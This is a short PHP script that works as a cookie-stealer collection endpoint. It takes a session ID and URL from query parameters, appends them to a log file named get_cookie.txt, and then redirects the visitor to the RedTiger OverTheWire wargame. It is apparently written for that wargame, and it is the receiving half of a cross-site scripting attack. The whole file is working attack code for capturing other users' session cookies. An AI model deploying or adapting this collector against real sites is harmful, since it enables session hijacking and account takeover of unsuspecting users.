<?php
$PHP_session = $_GET['PHPSESSID'];
$url = $_GET['url'];

$file_name = "get_cookie.txt";
$i = 1;
$f_read = fopen( $file_name, 'r' );
$buffer = "";
while ( !feof ( $f_read) )
{
	$getLine = stream_get_line( $f_read, 1024, "\n" );
	$buffer = $buffer.$getLine."\r\n";
	$i++;
}
$txt = $buffer.$url.' : '.$PHP_session;
$f_write = fopen($file_name, "w") or die("Unable to open file!");
fwrite($f_write, $txt);

fclose($f_read);
fclose($f_write);

header("Location:"."https://redtiger.labs.overthewire.org/");
?>